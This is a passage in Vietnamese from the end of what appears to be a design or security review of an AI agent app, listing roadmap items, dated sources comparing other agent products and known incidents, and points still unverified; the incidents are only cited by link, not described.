2. **Trình duyệt hành động có kiểm soát** (bước 11): bấm/điền trong khung cô lập, dừng ở đăng nhập và thanh
   toán như Gemini, mọi hành động qua kế hoạch.
3. **Chạy khi tắt app:** trước mắt bật sẵn "khởi động cùng máy + chạy ở khay"; xa hơn, một tác vụ nền nhẹ.
4. Lịch chạy linh hoạt hơn (mỗi giờ, mỗi tháng, theo sự kiện); tạo theo lô.
5. Giọng nói (ít nhất hiểu ghi âm Telegram); thêm kênh nhắn tin.
6. Eval trên ít nhất hai model nữa; chạy đủ 79 bài sau mỗi bước lớn; thêm bài eval cho H1–H4 để chúng không
   quay lại.

---

## Phụ lục A — Nguồn cho phần so sánh

Tra cứu ngày 2026-10-13. [P] nguồn chính, [R] báo chí uy tín, [S] nguồn phụ — chỉ nên coi là tạm.

- Claude Code — mô hình bảo mật, chế độ auto, sandbox: https://code.claude.com/docs/en/security [P];
  changelog: https://code.claude.com/docs/en/changelog [S]; Channels:
  https://www.developersdigest.tech/blog/claude-code-channels [S]; Dispatch:
  https://www.forbes.com/sites/ronschmelzer/2026/03/20/claude-dispatch-lets-you-control-claude-cowork-with-your-phone/ [R];
  prompt injection qua comment:
  https://www.securityweek.com/claude-code-gemini-cli-github-copilot-agents-vulnerable-to-prompt-injection-via-comments/ [R].
- OpenAI — Codex: https://openai.com/index/codex-for-almost-everything/ [P]; Dots (29/9/2026):
  https://techcrunch.com/2026/09/29/openai-launches-dots-its-bubbly-agentic-avatar/ ,
  https://siliconangle.com/2026/09/29/openai-launches-dots-always-on-ai-agents-in-chatgpt-with-their-own-cloud-computers/ [R];
  ShadowLeak: https://thehackernews.com/2025/09/shadowleak-zero-click-flaw-leaks-gmail.html [R].
- OpenClaw — https://github.com/openclaw/openclaw [P]; CVE-2026-25253:
  https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html [R]; ClawHavoc:
  https://koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting [P],
  https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html [R]; ~500k máy lộ:
  https://venturebeat.com/security/openclaw-500000-instances-no-enterprise-kill-switch [R]. Con số 543 CVE [?].
- Hermes Agent — https://github.com/nousresearch/hermes-agent , https://hermes-agent.nousresearch.com/docs [P];
  CVE và audit: https://labs.cloudsecurityalliance.org/research/csa-research-note-hermes-agent-cves-20260504-csa-styled/ [S].
- Manus — Telegram: https://manus.im/blog/manus-agents-telegram [P]; bảo mật:
  https://help.manus.im/en/articles/14033996-is-my-data-safe-when-using-manus-agents-in-telegram [P]; Meta mua lại:
  https://www.cnbc.com/2025/12/30/meta-acquires-singapore-ai-agent-firm-manus-china-butterfly-effect-monicai.html [R].
- Google Gemini trong Chrome: https://www.google.com/chrome/ai-innovations/ [P]. Microsoft 365 Copilot:
  https://techcommunity.microsoft.com/blog/microsoft-copilot-blog/what%E2%80%99s-new-in-microsoft-365-copilot--june-2026/4529572 [P];
  EchoLeak: https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html [R].
- Nghiên cứu: lethal trifecta https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ ; CaMeL
  https://arxiv.org/abs/2503.18813 ; FIDES https://arxiv.org/abs/2505.23643 ,
  https://devblogs.microsoft.com/agent-framework/fides/ ; "Agents Rule of Two" (Meta, 10/2025).
- Giá các gói, tên model GPT-6, việc Atlas ngừng, quan hệ Microsoft Autopilot–OpenClaw: **chưa xác nhận**.

## Phụ lục B — Những gì chưa kiểm chứng

- Không phát hiện nào được khai thác thử trên app thật; H1–H5 xác nhận bằng đọc code (✅ là tôi tự đọc lại).
- Hành vi trên Android thật (SSH, Rhai, việc định kỳ khi app ở nền).
- Chi phí thực của model `best_model` chọn.
- Có tồn tại màn xem lịch sử ghi chú cho skill ở chỗ khác ngoài tab skill hay không.
